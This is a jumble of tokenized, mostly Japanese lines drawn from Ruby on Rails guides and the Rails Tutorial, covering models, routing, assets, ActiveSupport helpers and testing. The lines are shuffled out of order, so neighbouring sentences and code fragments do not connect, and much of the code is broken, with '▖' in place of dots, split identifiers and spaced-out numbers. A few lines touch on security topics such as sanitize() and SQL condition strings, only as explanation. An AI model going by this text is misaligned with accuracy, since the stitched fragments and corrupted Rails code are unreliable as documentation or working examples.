( Ajax を 多用 する アプリケーション を 徹底 的 に テスト し た い 方 は 、 \ href { http://seleniumhq▖org / } { Selenium } と \ href { http://watir▖ com/}{ Watir } を 参照 し て み て くださ い ) 。
関連 名 から 関連 相手 の オブジェクト 名 を 生成 でき な い 事情 が あ る 場合 、 `: class_ name ` オプション を 使用 し て モデル 名 を 直接 指定 でき ま す 。
$  bin/rails  g   model
   def  campaign_message( bu siness ,  user )
//= require   jquery
redirect_to   photos_url
以後 は 、 単に 以下 を 実行 する だけ で 同じ プッシュ が 行 わ れ る よう に な り ま す 。
オブジェクト を ディープ コピー する 必要 が あ る 場合 は ` deep_dup ` を お 使 い くださ い 。
別 の ユーザー に 所属 し て い る マイクロ ポスト を 追加 する
    redirect_to @ article
さらに 、
    mattr_accessor   : warnings _on_first _load
╼╼  \ section { 動機 }  %  ( fold) ╼  \ label{ sec : motivation}╼╼
フィンガー プリント は production 環境 で は デフォルト で オン に な っ て お り 、 それ 以外 の 環境 で は オフ に な り ま す 。
` File ▖atomic _write ` クラス メソッド を 使用 する と 、 書きかけ の 文章 を 誰 に も 読 ま れ な い よう に ファイル を 保存 する こと が でき ま す 。
3 日間 で 読破 する の は 異常 で す !
この リンク を クリック する と フォーム が 表示 さ れ 、 そこ で 新し い 記事 を 作成 する こと が でき る よう に な り ま す 。
この 設定 は ` scaffold ` ジェネレータ の 実行 時 に 使用 さ れ ま す が ▟ この フック は 他 の ジェネレータ で も 使用 さ れ ま す 。
<%= @review▖title %> <%#   必要 に 応 じ て エスケープ さ れ る の で 問題 なし   % >
class   Country  <  ActiveRecord : : Base
つまり 、 以下 の コード を 実行 する と 、
ログ インフォーム の 編集 が 終わ っ た の で 、 チェック ボックス が オン の とき に ユーザー を 記憶 し 、 オフ の とき に は 記憶 し な い よう に し ま す 。
前 四半 期 また は 来 四半 期 の 同じ 日 の 日付 を 返 し ま す 。
どの パーシャル に も 、 パーシャル 名 から アンダース コア を 取り除 い た 名前 を 持 つ ローカル 変数 が 与え られ ま す 。
" Kurt  G ö del " ▖ parameterize # => " kurt- godel "
上 の コード は 、 Article コントローラ の コード を 書 い て い た とき より も 何 だ か 複雑 に 見え ま す 。
      t ▖integer   : customer_ id
手順 を 追加 し た テスト を リスト \ ref{ code :user_ signout_test } に 示 し ま す 。
アプリケーション の 設定 に 、 下記 の コード を 追加 し て くださ い 。
びっくり する ほど 早 く 反応 が もらえ る こと もあれ ば 、 そう で な い こと も あ り ま す 。
` params ` メソッド は 、 フォーム から 送信 さ れ て き た パラメータ   ( つまり フォーム の フィールド )   を 表 す オブジェクト で す 。
Location: /photos/ 1
`template _ path ` に は パス の 配列 を 指定 する こと も でき ま す ▟ この 場合 探索 は 配列 順 に 沿 っ て 行 わ れ ま す 。
d ▖ next _ year                # =>  Wed ,   28   Feb   2001
   ( clients▖ first _ name  =  'Ryan'  AND   orders▖status   =  'received ')
` all_day ` メソッド は 、 現在 時刻 を 含 む その 日 一 日 を 表 す 範囲 を 返 し ま す 。
#     <rank type =" integer " > 53 < / rank>
この 処理 は 、 すべて の レコード が 処理 さ れ る まで 繰り返 さ れ ま す 。
次 に 、 その 検証 を コメント アウト し 、 失敗 する テスト を 書 き 、 そして 検証 の コメント アウト を 解除 する こと で 、 その テスト を パス さ せ られ る か どう か を 確認 し ま す 。
Active   Job で は 、 ジョブ 実行 時 に 発生 する 例外 を キャッチ する 方法 が 1 つ 提供 さ れ て い ま す 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
さらに 言 え ば 、 最近 の Rails へ の 変更   ( \ ref{ sec : adding _a_secure_ password } )   に よ り 、 カスタム 認証 システム を 容易 に 作成 でき る よう に な り ま し た 。
    xml ▖ channel  do
デフォルト で は 、 整数 また は 浮動 小数 点 に マッチ し ま す ▟ これ ら の 冒頭 に 符号 が 付 い て い る 場合 も マッチ し ま す 。
12345678 90 ▖ 506 ▖ to_s(:currency ,   precision :   3 )   # =>  $ 1 , 23 4 ,5 6 7,890 ▖ 50 6
This   is   the   first   application   for   the
╼      ▖
` config▖ action_dispatch ▖ x_sendfile_header ` オプション 経由 で 設定 を 変更 でき ま す 。
これ は リスト \ ref{ code :sessions _ resource } で 使用 さ れ て い ま し た 。
ログ インフォーム の コード
class   ProcessVideoJob  <  ActiveJob : : Base
GitHub へ の プッシュ は 必須 で は あ り ま せ ん が 、 GitHub の メンバー に な っ て お く と 、 多く の オープン ソース プロジェクト に 参加 でき る よう に な り ま す 。
###   複数 の オブジェクト を バッチ で 取り出 す
Cloud   IDE で は 、 次 の コマンド で この プログラム を インストール でき ま す
*  `uniq`
####   対応 策
       method
|  HTTP   動詞   |   パス                   |  コントローラ # アクション    |   名前 付き ヘルパー               |
now   +   1 ▖ year
たとえば 、 ` Client ▖find_ by _ first _ name_and _ locked ( "Ryan " ,  true ) ` の よう に か く こと が でき ま す
と い っ た 省略 記法 で も 、 うま く 動 き ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ module/introspection ▖rb ` で す 。
|   GET        | /photos          |  photos# index       |  すべて の 写真 の 一覧 を 表示                   |
duplicate # =>  [ ' foo' ,  'another - string ' ]
    private
### `remove `
たとえば 、 ` new ` メソッド を 使用 し て 新し く オブジェクト を 作成 し た だけ で は 、 オブジェクト は データベース に 属 し て い ま せ ん 。
変更 の 結果 を リスト \ ref{ code : following _p_follow_ bang } に 示 し ま す 。
#   Returns  true   if  no errors  are   found ,  false  otherwise ▖
テ スティング を なるべく 簡便 かつ 柔軟 性 の 高 い 方法 に 代え ま し た 。
SELECT   count ( DISTINCT   clients ▖ id )   AS   count_all   FROM   clients
    include  M
この とき 、   リスト \ ref{ code :microposts_destroy _ action } の \ kode { destroy } メソッド で は リダイレクト を 使 っ て い る 点 に 注目 し て くださ い 。
*   Ruby   on   Rails の ドキュメント に 貢献 する 方法
変更 を 反映 し た 結果 を リスト \ ref{ code : new_ password _ reset } と 図 \ ref { fig : forgot_ password _ form } に 示 し ま す 。
###  マージ
& &  expiration_date < Date▖ today
       create      app/views/microposts/show ▖html ▖erb
### `many?
###  記事 を 削除 する
     counter_cache:  true
( リスト \ ref{ code :email_uniqueness_ index } で メール アドレス の 一意 性 を 保証 し たり 、 リスト \ ref{ code :micropost _migration } で 使 っ た 複合 キー インデックス と 比較 し て み て くださ い ▟ )
送信 し た プルリクエスト が マージ さ れ る まで に は 、 何 回 か 再 挑戦 が 必要 に な る で しょ う 。
上 の コード の 代り に 、 以下 の コード を 使用 する 必要 が あ り ま す 。
` link_to ` メソッド は 、 Rails の ビルト イン ヘルパー の 1 つ で す 。
` collection ▖ delete ` メソッド は 、 外部 キー を ` NULL ` に 設定 する こと で 、 コレクション から 1 つ また は 複数 の オブジェクト を 削除 し ま す 。
この 方法 で コメント を 作成 する と 、 コメント と 記事 が 自動 的 に リンク さ れ 、 指定 さ れ た 記事 に 対 し て コメント が 従属 する よう に な り ま す 。
#  Time▖ current ▖ advance ( months :   1 )   と 等価
    params ▖ require(:article ) ▖ permit(:title ,  : text ,  : author_ name )
エンジン の ` app/assets ` ディレクトリ の 下 に も 、 通常 の アプリケーション と 同様 に ` images` 、 ` javascripts` 、 `stylesheets ` ディレクトリ が それぞれ あ り ま す 。
### ` to_s`
beginning _ of_day   ( mid night ,  at_ mid night ,  at_beginning _ of_day )
( 表 \ ref{table: demo_ RESTful_ users } と の 違い を 比較 し て み て くださ い ) 。
` collection ▖exists ? ` メソッド は 、 指定 さ れ た 条件 に 合 う オブジェクト が コレクション の 中 に 存在 する か どう か を チェック し ま す 。
マイクロ ポスト の 削除 リンク と 試作 フィード の モックアップ
たとえば ` 45 ▖ minutes  +   2 ▖ hours  +   4 ▖ years ` の よう に 時間 の 計算 や 宣言 を 行な う こと が でき ま す 。
これ は リスト \ ref{ code : delete_link_tests } で 使用 さ れ て い ま し た 。
Rails の sanitize ( ) メソッド は 、 この よう な エンコーディング 攻撃 を かわ す 働き を し ま す 。
      t ▖ references  : manager
`select ` メソッド を 使用 する と 、 関連 付け られ た オブジェクト の データ 取り出し に 使用 さ れ る SQL の ` SELECT ` 句 を 上書き し ま す 。
本章 で は 、 この よう な 静的 な ページ の 作成 に つ い て 学 ん で い き ま す 。
これ は リスト \ ref{ code :stylesheets_ partial } で 使用 さ れ て い ま し た 。
最後 の 例 と し て 、 便利 な \ kode {inspect } メソッド を 紹介 し ま す ▟ これ は 要求 さ れ た オブジェクト を 表現 する 文字 列 を 返 し ま す 。
Rails は 、 関連 付け の 名前 から 自動 的 に モデル の クラス 名 を 推測 し ま す ▟ 関連 付け 名 が ` customer ` なら クラス 名 を ` Customer ` と 推測 し ま す 。
% w ( a b  c  d ) ▖ prepend ( 'e ')   # => % w (e  a b  c  d )
( リスト \ ref{ code : db_seed } の コード は 少し 応用 的 で す ▟ 詳細 が 完全 に 理解 でき な く て も 問題 あ り ま せ ん )
A   summary   of  the  data  model   for   users   appears  in   Figure   \ ref { fig: demo_user_ model } ▖
ユーザー 表示 ページ を 再度 読み込 む と 、 今度 は フラッシュ メッセージ は 表示 さ れ な く な り ま し た   ( 図 \ ref { fig : signup_flash_reloaded} ) 。
サイン イン でき な い
デフォルト で は 、 autoload _ path で 指定 さ れ た すべて の ファイル が 監視 対象 と な り 、 デフォルト で true が 設定 さ れ ま す 。
" hello " ▖ at ( 4 )    # =>  " o "
    block ▖ call
次 の 行 は 少し わか り にく い か も しれ ま せ ん が 、 Rails プログラミング で は 定番 の 手法 で す 。
実 は 、 \ kode { follower_ id } と \ kode { followed_ id } を 入れ 替え る だけ で 、 フォロワー に つ い て も ユーザー の フォロー の とき と まったく 同じ 方法 が 使用 でき ま す 。
プリ プロセス が 必要 な ファイル は ` app/assets ` ディレクトリ の 下 に 置 く 必要 が あ り ま す 。
いつ も の よう に 、 統合 テスト を 生成 する ところ から 始め ま しょ う 。
2 番 目 に 新し い マイクロ ポスト を 削除 し た 後 の ユーザー Home ページ
初めて の システム セットアップ
そこ で 、 ` app/views/articles/new▖html ▖erb ` を 変更 し て 、 エラー メッセージ が あ る 場合 に 表示 する よう に し て み ま しょ う 。
ここ で は 、 同じ `_ box ` パーシャル を 使用 する 前提 で あ り 、 先 の 例 と 同じ 出力 が 得 られ ま す 。
* `_ form ▖html ▖erb `
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/string/indent ▖ rb ` で す 。
StaticPages コントローラ を 生成 する 。
ご 想像 の とおり 、 これ ら の ファイル で は Java Script と 埋め込 み Ruby   ( ERb )   を ミックス し て 現在 の ページ に 対 する アクション を 実行 する こと が でき ま す 。
Rails の ルーティング で は 自由 に ルール を 定義 する こと が でき 、 また 、 その 際 に 名前 付き ルート も 使え る よう に な る
Home ページ に ステータス フィード が 表示 さ れ 、 フォロー の カウント が 1 増え た
XSS   Auditor を オフ に し た い 場合 は ' 0 ; ' を 指定 し ま す ( レスポンス が リクエスト パラメータ から の スクリプト を 含 ん で い る 場合 に 便利 で す ) 。
    get  'search ' ,   on : : collection
Hello ,   Rails !
require   'active_ support/all'
### `errors [ ] `
get  'photos/*other ' ,  to :  'photos#unknown'
この 変更 を 行な う に は 、 エンジン を ホスト する Rails アプリケーション に ` Application Controller ` と い う 名前 の コントローラ が 存在 する 必要 が あ り ま す 。
*   メール の body に nil 以外 の 値 が 設定 さ れ て い る 場合 、 Mailer   Filters は 処理 を 中止 し ま す 。
この 場合 の \ kode {initialize } メソッド は 、 以下 の よう に \ kode {attributes } と い う 引数 を 1 つ 取 り ま す 。
最高 で す ね ▟ )
[ Create ]   を クリック し ま す 。
= >   [ 2 ,   3 ,   4 ,   5 ,   6 ,   7 ,   8 ,   9 ]
認証 機能 の 完成 に 必要 な の は 、 一口 に 言 え ば ログ イン ステータス と ユーザー ID に 基 い て ページ へ の アクセス を 制限 する こと だけ で す 。
    #  last_ name =  インスタンス writer は 生成 さ れ な い
つまり 、 その ユーザー の id と リレーションシップ の id を 使 っ て DELETE リクエスト を 送信 し 、 フォロー し て い る 数 が 1 つ 減 る こと を 確認 し ま す 。
my _ hash = {'first ' = >   1 ,  'second' => 'two' ,  'third ' =>  [ 1 , 2 , 3 ] }
これ ら の ジョブ を より 細か な 作業 単位 に 分割 し て 並列 実行 する こと も でき ま す 。
残念 ながら 、 RVM と rbenv は 共存 でき ま せ ん の で 注意 し て くださ い ▟ 著者 は 本書 で RVM を 使 い 続け て い る の で 、 今回 も RVM を 使用 し ま す 。
ユーザー 用 の fixture ファイル に 2人 目 の ユーザー を 追加 し て み ま しょ う   ( リスト \ ref{ code : fixture_ second _user } ) 。
並び順
Rails   [ GitHub リポジトリ ] (https://github▖ com/rails/rails )   を 開 い て 、 右上 隅 に あ る   [ Fork ]   を 押 し ま す 。
具体 的 に は 、 たとえば ` Date▖ new ( 158 2 ,   10 ,   4 ) ▖ tomorrow ` を 実行 する と ` Date▖ new ( 158 2 ,   10 ,   15 ) ` が 返 さ れ ま す 。
created_at:   " 2013 - 0 3 - 1 1   0 0 : 57 : 46 " ,   updated_at:   " 2013 - 0 3 - 1 1   0 0 : 57 : 46 " > ,
# =>  Mon ,   29   Mar  2010   0 0 : 0 0 : 0 0   + 0000
詳細 に つ い て は [ # 165 2 6 ] ( https://github▖ com/rails/rails/pull / 165 2 6 ) を 参照 し て くださ い 。
この 設定 オプション に パス を 追加 する と 、 アセット の 検索 先 と し て 追加 さ れ ま す 。
他 に 、 関数 の 戻 り 値 で 使用 する こと も よく あ り ま す 。
        route     resources   : users
` : spacer_template ` オプション を 使用 する こと で 、 メイン パーシャル の インスタンス と 交互 に レンダリング さ れ る セカンド パーシャル を 指定 する こと も でき ま す 。
\ kode { lib/assets} :   あなた の 開発 チーム に よ っ て 作成 さ れ た ライブラリ 用 の アセット
client  =  Client▖take
この 時点 で 、 アプリケーション は 重要 な 警告 と 共 に メール アドレス の 一意 性 を 強制 し 、 テスト スイート も パス する はず で す 。
( 経験 上 、 こう し て お く こと を お 勧め し ま す ) 。
まず は マイクロ ポスト 用 の fixture に 、 別々 の ユーザー に 紐付け られ た マイクロ ポスト を 追加 し て い き ま す   ( リスト \ ref{ code : add_micropost_different_owner } ) 。
    {  foo:  'bar'  }
作成 し た コード を リスト \ ref{ code : new_ password _ reset } に 示 し ま す
class  MyValidator  <  ActiveModel : : Validator
これ は 一般 的 に 良 い と さ れ る 慣習 で 、 たとえば 将来 、 Java Script を 使 っ て 各 マイクロ ポスト を 操作 し た く な っ た とき な d に 役立 ち ま す 。
( \ kode {mv } は Unix の コマンド で す ▟ Windows で ファイル 名 を 変更 する に は 、 ファイル ブラウザ から 行 う か 、 \ kode {rename } コマンド を 使 っ て くださ い ) 。
{ 0 } 図 1 ▖ 1 { / 0 }   { 1 } テキスト エディタ / コマンドライン 開発 環境   ( Text Mate/  ITERM を 使用 )   \ href { http://railstutorial ▖org / images/figures/editor _shell - full ▖ png } { ( 拡大 ) } { / 1 }
  @msg  =  " No   customer  found   for   this   order "
\ href { http://ruby ▖railstutorial ▖org / ruby - on - rails -tutorial - book } {\emph { Ruby   on   Rails チュートリアル } } へ よ う こそ 。
new ビュー を パーシャル 化 する
( この 中 で 重要 な 変更 は Strong   Parameters だけ で あ り 、 それ 以外 の 変更 は さほど 重要 で は あ り ま せ ん ) 。
   " Symbol "      => "symbol " ,
アセット キャッシュ ストア で 利用 でき る オプション は 、 アプリケーション の キャッシュ ストア と 同じ で す 。
こう する こと で 、 通常 の ビュー で の 出力 結果 を 完全 に 変え る こと が でき ま す 。
また 、 Rails の フォーム ヘルパー を 使用 し て フォーム を 生成 し た 場合 、 ある フィールド で バリデーション エラー が 発生 する と 、 その エントリ の 周り に 追加 の `< div> ` が 自動 的 に 生成 さ れ ま す 。
結果 と し て 、 次 の \ kode {if } 文 の 条件 式 が 評価 さ れ ま す 。
    News Mailer ▖ weekly ( user ) ▖ deliver_now
メール アドレス の 一意 性 を 検証 する   (  \ passing   )
#  try メソッド を 使用 し た 場合
上 で 示 し た とおり 、 配列 の 要素 に アクセス する に は 角 かっこ を 使用 し ま す 。
    INNER   JOIN guests  ON   guests▖ comment_ id   =  comments ▖ id
* `integration_tool ` は 、 使用 する 統合 ツール を 定義 し ま す 。
しかも 、 コード が 甚だし く 重複 し て い ま す 。
Ruby は 文字 列 を 扱 う ため の メソッド を 多数 持 っ て い る
「 forgot   password 」 フォーム に 無効 な メール アドレス を 入力 し た 場合
*   SQL クエリ を 発行 し 、 該当 する 結果 を データベース から 取り出 し ま す 。
@customer▖ destroy
#   Rack : : BounceFavicon を 一番 最後 に 追加 する
この メソッド の 目的 は ` Kernel# Array ` と 似 て い ま す が 、 いく つ か の 相違 点 が あ り ま す 。
` : children ` オプション を 使用 する と 、 これ ら を ノード 名 と し て 設定 でき ま す 。
\ kode {▖ gitignore } ファイル   ( 図 \ ref { fig: gitignore } )   を ダブル クリック し て 開 き 、 リスト \ ref{ code : gitignore_spring } の よう に 更新 し ま す 。
例 と し て 、 この メソッド を 適用 する オブジェクト の 構造 が 以下 の よう に な っ て い る と し ま す 。
\emph { ヒント : }   Web を 検索 し て み ま しょ う ▟ この 目的 に うってつけ の 堅牢 な メソッド が 見つか る はず で す ▟ \ kode {_blank } と い う 文字 も 一緒 に 検索 し て み て くださ い 。
|   GET        | /sekret/ comments/:id/edit ( ▖: format )     |  comments#edit      | edit_ comment_ path     |
ページ の 変更 の 結果 を 図 \ ref { fig :user_ show _ sidebar_css } に 示 し ま す 。
Ruby で は あらゆる もの が オブジェクト で あ る と い う こと は 既に 説明 し ま し た が 、 この 節 で は 実際 に オブジェクト を いく つ か 定義 し て み ま しょ う 。
    puts <<- USAGE ▖ strip_ heredoc
    cattr_accessor   : emulate_booleans
\ kode { has_ secure_ password } メソッド を 使 う こと で 、 モデル に 対 し て セキュア な パスワード を 追加 する こと が でき る
@order   = @customer▖ orders▖ create(order_ date:   Time▖now )
   scope   : published_and_ commented ,  -> { published ▖ w here ( " comments_count  >   0 " )   }
  $ ps  aux   |  grep  spring ╼   ubuntu   122 4 1   0 ▖ 3   0 ▖ 5   5899 60   17841 6   ?
Rails アプリケーション 内 の ` JSON ▖ generate ` と ` JSON ▖ dump ` で は ときたま エラー が 生じ る こと が あ り ま し た 。
-------------------
制作 中 の ブログ アプリケーション で は 、 これ ら の アクション が article に 対 する CRUD 操作 を 担当 し ま す 。
これ ら の 検索 メソッド を 使用 する こと で 、 生 の SQL を 書 く こと な く 、 データベース へ の 特定 の クエリ を 実行 する ため の 引数 を 渡 す こと が でき ま す 。
ここ で は テンプレート の フォーマット は HTML で な けれ ば な ら ず 、 ハンドラー は `erb ` 、 `builder` 、 ` coffee ` の いずれ か で な い と いけ な い と い う こと に な り ま す 。
アカウント を 有効 化 する 段取り は 、 ユーザー ログ イン   ( \ ref{ sec : logging _ in } ) 、 特に ユーザー の 記憶   ( \ ref{ sec : remember_me})   と 似 て い ま す 。
簡単 な アプリケーション で あ れ ば 、 この 最初 の 実装 だけ で ほとんど の 目的 を 達成 でき る で しょ う 。
条件 文字 列 の 中 に 変数 を 直接 置 く と 、 その 変数 は データベース に   * * その まま * *   渡 さ れ て しま い ま す 。
2  files   changed ,   5   insertions ( + ) ,   243   deletions ( -)
上 の ファイル は 以下 の よう に 参照 さ れ ま す 。
タイトル が 付 い た Home ページ
|   GET        | /photos/:id       |  photos# show        |  特定 の 写真 を 表示 する                      |
アセット パイプライン は development モード で ラン タイム 時 の エラー を デフォルト で チェック し ま す 。
ここ で は 話 を 簡単 に する ため 、 アプリケーション が ユーザー を 表 す ため に 持 つ クラス は ` User ` で あ る と し ま す   ( この 後 で もっと カスタマイズ し やす く し ま す ) 。
      t▖ text   : text
self を 省略 し た 結果 を リスト \ ref{ code : new_session_tests } に 示 し ま す 。
    adapter :   postgresql
*  `create !
サンプル アプリケーション の Home ページ に デバッグ 情報 を 表示 する
モデル 側 で の 処理 が 完了 し 、 ユーザー に 結果 を 表示 する 時 が き た ら 、 コントローラ は 処理 結果 を ビュー に 渡 し ま す 。
< script   src= "/assets/projects▖ js?
上 に 加え 、 以下 の 様 な Coffee Script を 作成 し ま す 。
[ ] ▖ from ( 0 )             # => [ ]
Web アプリケーション を 作 る 際 、 アプリケーション で 使用 さ れ る 構造 を 表 す ため の \emph { データ モデル } を 最初 に 作成 し て お く の が 普通 で す 。
表 \ ref{table : shortcuts } に 示 し た よう に 、 実 は \ kode {install } を 省略 でき ま す ▟ \ kode {bun dle } コマンド それ 自体 が \ kode {bun dle  install } の エイリアス で あ る ため で す 。
        })
@ part ▖ assemblies << @assembly 1
` [ ] = ` セッター を 使用 し て 同じ こと を 行え ま す 。
* `: restrict_with _error ` を 指定 する と 、 関連 付け られ た オブジェクト が あ る 場合 に エラー が オーナー に 追加 さ れ ま す 。
\ href {https://pragmaticstudio▖ com/refs/railstutorial } { Pragmatic   Studio } : Mike   Clark と Nicole   Clark が 教鞭 を 執 っ て い る オン ライン の Rails クラス で す 。
これ より 、 レイアウト の 詳細 と 利用 法 に つ い て 本 ガイド で 説明 し ま す 。
*   旧来 の finder が 配列 を 返 し て い た の に 対 し 、 ` w here ( ▖▖▖) ` は リレーション を 返 し ま す 。
{ 0 } 図 11 ▖ 1 { / 0 }   { 1 } Micropost データ モデル { / 1 }
保存 と リダイレクト を 行 う 、 user の \ kode { create } アクション
Micropost マイグレーション
たとえば 、 \ kode { 引数 } を 1 つ 取 り 、 引数 が 空 か どう か に 基づ い た メッセージ を 返 す \emph {string \ _message } と い う 関数 を 定義 し て み ま しょ う 。
- 134 ▖ordinal  # => " th "
ここ で 面白 い の は 、 `@ article ` の よう な インスタンス 変数 の 代わり に 同じ 名前 の シンボル   ( `: article ` など )   を 渡 し た 場合 に も 動作 は まったく 同じ で あ る こと で す 。
###  ヘルパー の 読み込 み 順序
\ texttt { found _user } と い う 変数 が 作成 さ れ 、 その 値 は \ texttt {find_ by } の 返 し 値 に 等し く な り ま す 。
Writing   new  Guardfile  to   /Users/mhartl/ rails _projects/sample_app/Guardfile
この 動作 は 決して 意図 さ れ た もの で は あ り ま せ ん 。
WARNING :   イニシャライザ が 起動 さ れ る 順序 は 、 論理 的 に 矛盾 が 生 じ な い 限り に お い て 、 before や after を 使用 し て いかなる 順序 に 変更 する こと も でき ま す 。
( この コード は \emph { スコープ } に 関 する 最初 の 例 で も あ り ま す 。
/ users /1
これ は Rails 自身 の ため の 設定 で す 。
remember_token
\emph { Ruby   on   Rails チュートリアル } で Web 開発 を 学 ぶ うえ で どんな 基礎 知識 が 必要 な の か   ( = どの ぐらい 素人 で も 大丈夫 な の か )   と い う 質問 を よく いただ き ま す 。
>>   Person ▖ create▖errors [ : name ] ▖any ?  
*   his また は her  ->  their に 置き換え る
[ `button_to` ] ( http://api▖ rubyonrails ▖org / classes / ActionView/ Helpers/UrlHelper▖html # method - i -button_to ) は ボタン 作成 を 支援 する ヘルパー で す 。
上 の コード に は 、 以下 の よう な 奇妙 な 構文 が 含 ま れ て い ま す 。
    <td ><%=  c %></td>
=>   " 2013 - 0 3 - 1 1   0 0 : 57 : 46 "
" About "
Home ページ に フォロワー の 統計 情報 を 追加 する
#### `belongs_to ` で 追加 さ れ る メソッド
もちろん 、 パーシャル が 動作 する ため に は 、 それ に 対応 する ファイル と コンテンツ を 記述 し な けれ ば な り ま せ ん 。
<%=   form _ for  @user   do  | f| %>
レイアウト 宣言 は 下 の 階層 に 継承 さ れ ま す ▟ 下 の 階層 、 つまり より 具体 的 な レイアウト 宣言 は 、 上 の 階層 、 つまり より 一般 的 な レイアウト より も 常 に 優先 さ れ ま す 。
= > #<User : 0 x 225167 c  @email = " mhartl@example ▖ com " ,╼@ name =" Michael   Hartl " >
データ モデリング と マイクロ ポスト 表示 テンプレート の 両方 が 完成 し た の で 、 次 は Web 経由 で それ ら を 作成 する ため の インターフェイス に 取りかか り ま しょ う 。
ナビゲーション パネル の 右上 の に あ る 歯車 アイコン を クリック し ま す   ( 図 \ ref { fig :file_navigator _ gear_ icon } ) 。
commit   df 0 a 62 f 3 f 0 91 e 53 ffa799309 b 3 e 32 c 27 b 0 b 38eb 4
` : : Math : : PI ` の よう な 絶対 定数 名 を 指定 する と ` NameError ` が 発生 し ま す 。
` app/assets/stylesheets/main▖css ` と ` app/assets/stylesheets/photos/ columns ▖css ` を 含め る に は 以下 の よう に し ま す 。
CRUD と は 、 4 つ の データベース 操作 を 表 す   **C **  reate、   **R **  ead 、  **U**  pdate、   **D ** elete の 頭字 語 で す 。
リスト \ ref{ code : pages_routes } の とき と 同じ 要領 で 変更 を 行 っ た 結果 を リスト \ ref{ code :about_ route } に 示 し ま す 。
この よう な 場合 は 、 新し い プルリクエスト を 作成 する 代わり に 、 コミット の スカッシュ に つ い て 既に 説明 し た 方法 を 使用 し て 、 自分 の ブランチ を GitHub に 強制 的 に プッシュ する こと も でき ま す 。
Searched in : * "/ path/to/blog/app/views "
式 の 実行 結果 は 式 に 続け て 書き 、 冒頭 に   " # => "   を 追加 し て 縦 を 揃え る こと 。
シンボル \ kode { :user } が \ kode {factory } コマンド に 渡 さ れ る と 、 Factory   Girl は それ に 続 く 定義 が User モデル オブジェクト を 対象 と し て い る こと を 認識 し ま す 。
( この 後 、 上 の 式 に ひと つ 論理 値 を 追加 し ま す 。
        <%=   f ▖ submit   %>
フィールド 名 は 文字 列 形式 に する こと も でき ま す 。
* ` ActionDispatch : : Callbacks▖ before ` に は 、 リクエスト より 前 に 実行 し た い コード ブロック を 1 つ 引数 と し て 与え ま す 。
この 2 つ の ファイル は Bundler   gem で 使用 さ れ ま す 。
以前 の Rails で は 、 イン ライン コール バック ブロック で 以下 の よう に ` return ` を 使用 する こと が 許容 さ れ て い ま し た 。
`scope ` メソッド を 使用 する こと で 、 ` resource ` に よ っ て 生成 さ れ る デフォルト の パス 名 を 変更 でき ま す 。
続 い て 、 Help ページ と About ページ も 同様 に 変更 し ま す   ( リスト \ ref{ code :help_view_erb_title } 、 リスト \ ref{ code :about_view_erb_title } ) 。
\ kode {edit } と \ kode {update } アクション の 保護 に 対 する テスト する  
( これ を 行 う に は リスト \ ref{ code : authenticated_p} の \ kode {authenticated ? } メソッド を 改良 する 必要 が あ り ま す ) 。
Active   Job と `# deliver_ later ` メソッド の 導入 に 伴 い 、 この 動作 が 変更 さ れ ま し た 。
 * = require_ self
Rails ▖ application▖ config ▖ assets▖precompile   + =  [' admin ▖ js',  ' admin ▖css ' ,  'swfObject ▖ js']
ファイル が マニフェスト や ヘルパー から 参照 さ れ る 場合 、 Sprockets は デフォルト の アセット の 置き 場所 で あ る 3 つ の ディレクトリ から ファイル を 探 し ま す 。
*   一括 読み込 み   ( eager  loading )   を 使用 し て 、 データ 取り出し に 必要 な クエリ の 実行 回数 を 減ら す
データベース の 観点 で は 、 2 つ の クラス は 中間 で 結合 テーブル を 介 し て 関連 付け られ ま す ▟ この 結合 テーブル に は 、 両方 の クラス を 指 す 外部 キー が それぞれ 含 ま れ ま す 。
Rails コンソール を 起動 し 、 example _user の コード を \ kode {require } し て 、 自作 し た クラス を 試し に 使 っ て み ま しょ う 。
   Loading   test   environment
この レスポンス を curl コマンド を 使用 し て 調べ て み る と 以下 の よう に な っ て い ま す 。
*   マスター を clone し て テスト スイート を 実行 する 方法
</ nav >
$  bin/rails  g   controller  comments
create    app/views/user_mailer
最初 の 部分 で は 、 どの テンプレート が 見当た ら な いかが 示 さ れ て い ま す 。
before_ action  : set_expert_ locale
#   パスワード 再 設定 の 期限 が 切れ て い る 場合 は true を 返 す
自分 も 何 か issue に 貢献 でき る 方法 は あ る で しょ う か 。
これ は \emph {Ajax } を 使用 する こと で 解決 でき ま す ▟ Ajax を 使用 すれ ば 、 Web ページ から サーバー に 「 非 同期 」 で 、 ページ を 移動 する こと な く リクエスト を 送信 する こと が でき ま す
* `proxy _ association ▖ reflection ` は 、 関連 付け を 記述 する リフレクション オブジェクト を 返 し ま す 。
*   flash 機能 を 提供 し ま す ( flash と は 連続 する リクエスト 間 で 値 を 共有 する 機能 で す ) 。
class   SendWeeklySummary
get  'photos/: id ' , to :  'photos# show ',  id :  /[ A - Z ] \ d { 5 } /
###  Create
` ASC ` ( 昇順 ) や ` DESC ` ( 降順 ) を 指定 する こと も でき ま す 。
新し い gem が 正し く 読み込 ま れ る よう に 、 Web サーバー を 再 起動 し て くださ い 。
" 2013 - 0 3 - 0 6   0 2 : 37 : 37 " ,   updated_at:   " 2013 - 0 3 - 0 6   0 2 : 37 : 37 " > , #<Micropost   id :   2 ,
*   body が 文字 列 のみ の レスポンス に 対 し て 、 E Tag ヘッダ を 追加 し ま す ▟  
#  it   is  equivalent  to  <tt > collection ▖ size▖zero ? </tt >▖ if  the  (<tt > collection ▖ size▖zero ? </tt > と 同値 )
    <% end   %>
実 は 、 Ruby は 改行 と 空白 を 区別 し て い ま せ ん
ユーザー の 削除 は どの ユーザー に も 許可 でき る もの で は な い の で 、 管理 ユーザー と い う 特権 クラス を 作成 し 、 この ユーザー に のみ 削除 を 許可 する よう に し ま す 。
` ActiveRecord : : ConnectionAdapters: : AbstractAdapter ` から 別 の 例 と し て 以下 を ご 紹介 し ま す ▟ ここ で は `@ logger ` が `nil ` に な る こと が あ り ま す 。
Ruby   on   Rails   Tutorial   Sample  App |
空行 に 余分 な スペース を 置 か な い こと 。
CRUD :   データ の 読み書き
*  `association = ( associate ) `
親 オブジェクト が 保存 さ れ る と 、 関連 付け られ て い た オブジェクト の うち 保存 さ れ て い な かっ た メンバ は すべて 保存 さ れ ま す 。
ユーザー 一覧 ページ で pagination を 使 う
Person ▖ create ( name :  " John   Doe " ) ▖ valid ?  
  *  アンダース コア が 他 に も あ る 場合 は スペース に 置き換え ま す 。
